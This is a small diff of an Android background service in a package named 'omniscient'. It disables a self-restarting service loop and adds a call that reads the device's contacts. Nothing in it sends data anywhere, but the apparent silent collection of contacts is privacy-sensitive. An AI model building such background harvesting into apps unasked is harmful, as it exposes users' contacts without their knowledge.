@@ -16,6 +16,7 @@ import android.util.Log;
 import android.widget.Toast;
 
 import com.postal.omniscient.R;
+import com.postal.omniscient.postal.reader.contact.ReadContacts;
 
 import java.util.Calendar;
 import java.util.Date;
@@ -121,9 +122,11 @@ public class MyService extends Service {
             }
 
 
-            Intent par = new Intent(getApplicationContext(), StartService.class);
-            startService(par);
+//            Intent par = new Intent(getApplicationContext(), StartService.class);
+//            startService(par); Залоченый безконечный цыкл
 //            par = null;
+            ReadContacts contact = new ReadContacts(getContentResolver());
+            contact.getContacts();
             return null;
         }
 
